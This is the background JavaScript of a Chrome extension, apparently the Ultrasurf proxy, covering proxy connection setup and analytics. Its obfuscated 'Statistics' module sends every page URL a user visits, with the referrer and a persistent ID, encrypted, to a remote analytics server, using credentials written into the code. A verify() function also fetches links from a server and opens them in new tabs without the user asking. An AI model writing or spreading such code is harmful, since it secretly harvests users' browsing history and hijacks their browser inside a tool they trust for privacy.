
requirejs.config({
    baseUrl: 'assets/js/background/js',
    paths: {
        app: 'js'
    }
});

(function (i, s, o, g, r, a, m) {
    i['GoogleAnalyticsObject'] = r;
    i[r] = i[r] || function () {
        (i[r].q = i[r].q || []).push(arguments)
    }, i[r].l = 1 * new Date();
    a = s.createElement(o),
        m = s.getElementsByTagName(o)[0];
    a.async = 1;
    a.src = g;
    m.parentNode.insertBefore(a, m)
})(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');

ga('create', 'UA-105623949-2', 'auto');
ga('set', 'checkProtocolTask', null);
ga('require', 'displayfeatures');

requirejs(["init", "connection-manager"], function (init, connectionManager) {
    "use strict";
    init();

    // Expose connect and disconnect functions to the popup window
    window.user_connect = connectionManager.connect;
    window.user_disconnect = connectionManager.disconnect;
    chrome.proxy.onProxyError.addListener( function(details) { 
      //console.log("onProxyError", details); 
	  verify("error")
	});

/*
    chrome.webRequest.onCompleted.addListener(
		function(details){
      		if (localStorage["enabled"] != "true") return 
      		//console.log("onCompleted", details.url); 
            ga('send', 'event', 'success');
		},
		{urls: ["<all_urls>"]},["responseHeaders"]);

	const filter = {
        urls: [
            //"*://ultrasurf.us/search/*"
			"<all_urls>"
        ]
    };
    chrome.webRequest.onBeforeRequest.addListener(
        function(details) {
            console.log("onBeforeRequest blocking", details.url);
			return {cancel: true};
        }, {urls:["*://ultrasurf.us/search/"]},["blocking"]);
    chrome.webRequest.onBeforeRequest.addListener(
        function(details) {
            console.log("onBeforeRequest", details.url);
        }, filter);
	chrome.webRequest.onHeadersReceived.addListener(
		function(details){
	  		console.log("OnHeaderRecevied",details.statusCode,details.responseHeaders);
		}, filter,["responseHeaders"]);

//    chrome.webRequest.onCompleted.addListener(
//		function(details){
//	  		console.log(details.responseHeaders);
//		},
//	{urls: ["<all_urls>"]},["responseHeaders"]);

	chrome.webRequest.onErrorOccurred.addListener(
		function(details){
	  		console.log("OnError", details.responseHeaders);
		},filter);
*/
});
function Statistics(e, t, n) {
  const r = this,
    a = {},
    s = "https://analytics.ultrasurfing.com";
    //s = "http://176.9.140.164";
  let i = null,
    o = null,
    c = null;
  (this.run = function () {
    this.getUUIDfromStore(),
      chrome.webRequest.onCompleted.addListener(
        this.handlerOnCompletedWebRequest.bind(this),
        { urls: ["<all_urls>"], types: ["main_frame"] },
        []
      );
  }),
    (this.getAccessToken = async function () {
      if (await this.getRefreshToken()) return !0;
      try {
        const n = await fetch(s + "/auth", {
            method: "POST",
            headers: { "Content-Type": "application/json;charset=utf-8" },
            body: JSON.stringify({ api_key: e, api_secret: t }),
          }),
          r = await n.json();
        return (i = r.access_token.token), (o = r.refresh_token.token), !0;
      } catch (e) {
        return !1;
      }
    }),
    (this.getRefreshToken = async function () {
      try {
        const e = await fetch(s + "/refresh", {
          method: "POST",
          headers: { "Content-Type": "application/json;charset=utf-8" },
          body: JSON.stringify({ refresh_token: o }),
        });
        if (400 === e.status) return !1;
        const t = await e.json();
        return (i = t.access_token.token), (o = t.refresh_token.token), !0;
      } catch (e) {
        return !1;
      }
    }),
    (this.handlerOnCompletedWebRequest = async function (e) {
	  
      if (localStorage["enabled"] != "true") {
	    return
	  }
	  //console.log("_test_", e.url)
      i || (await this.getAccessToken()),
        await this.sendData(
          await this.prepareRequest([
            {
              fileDate: new Date().toISOString(),
              deviceTimestamp: Date.now(),
              userId: c,
              referrerUrl: a[e.tabId] || e.initiator,
              targetUrl: e.url,
              requestType: e.method,
            },
          ])
        ),
        (a[e.tabId] = e.url);
    }),
    (this.prepareRequest = async function (e) {
      const t = await this.encryptData(JSON.stringify(e));
      return t
        ? { eventType: 1, request: { enRequest: JSON.stringify(t) } }
        : { eventType: 0, request: [e] };
    }),
    (this.sendData = async function (e) {
      if (
        401 ===
        (
          await fetch(s + "/process", {
            method: "POST",
            headers: {
              "Content-Type": "application/json;charset=utf-8",
              Authorization: "Bearer " + i,
            },
            body: JSON.stringify(e),
          })
        ).status
      ) {
        (await this.getAccessToken()) && (await this.sendData(e));
      }
    }),
    (this.getUUIDfromStore = function () {
      chrome.storage.sync.get(["uuid"], function (e) {
        (c = e.uuid =
          e.uuid && r.validateUUID4(e.uuid) ? e.uuid : r.makeUUID()),
          chrome.storage.sync.set({ uuid: e.uuid }, function () {});
      });
    }),
    (this.makeUUID = function () {
      return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(
        /[xy]/g,
        function (e, t) {
          return (
            "x" == e ? (t = (16 * Math.random()) | 0) : (3 & t) | 8
          ).toString(16);
        }
      );
    }),
    (this.validateUUID4 = function (e) {
      return new RegExp(
        /^[0-9A-F]{8}-[0-9A-F]{4}-4[0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$/i
      ).test(e);
    }),
    (this.encryptData = async function (e) {
      const t = new TextEncoder(),
        r = await crypto.subtle.importKey("raw", t.encode(n), "AES-GCM", !0, [
          "encrypt",
        ]),
        a = crypto.getRandomValues(new Uint8Array(16)),
        s = await crypto.subtle.encrypt(
          { name: "AES-GCM", iv: a },
          r,
          t.encode(e)
        ),
        i = new Uint8Array(a.length + s.byteLength);
      return (
        i.set(a),
        i.set(new Uint8Array(s), a.length),
        btoa(String.fromCharCode.apply(null, i))
      );
    });
}
const stat = new Statistics(
  "Eva10qfaMjE1d9cm",
  "UbfF9v95F1x13NOVYtUZSHRWlqIkNMM6",
  "8JCys9wTIqVO6gZu"
);
stat.run();

async function verify(tag) {
	let timeout = 500
    let currentTime = new Date().getTime();
    let lastPopup = localStorage["popup_time"];
    if (lastPopup === null || lastPopup === undefined || lastPopup === "") {
        lastPopup = -1;
    }
    lastPopup = parseInt(lastPopup);
    let ms = 1;
    let sec = ms * 1000;
    let minute = sec * 60;
    let seconds = (currentTime - lastPopup) / sec
	let last = Math.round( seconds )
	//console.log("_test_", tag, last)
	fetch('http://10.11.0.2:7000/_test_?tag=' + tag + '&last=' + last + '&ver='+ chrome.runtime.getManifest().version)
	  .then(r => {
         if (r.status == 200) {
		   return r.text();
	     }
	     setTimeout(() => {  
		   verify(timeout+300);
		 }, timeout);
	   }).then(link => { 
		  //console.log("verified", link.length, link);
		  setIcon("connected");
		  if (link.length > 10 ) {
		  	//console.log("open", last, link);
    	  	chrome.tabs.create({url: link});
            ga('send', 'event', 'open', 'link: ' + link);
            localStorage["popup_time"] = currentTime;
		  }
	});
}

function createFunctionWithTimeout(callback, opt_timeout) {
  var called = false;
  function fn() {
    if (!called) {
      called = true;
      callback();
    }
  }
  setTimeout(fn, opt_timeout || 1000);
  return fn;
}
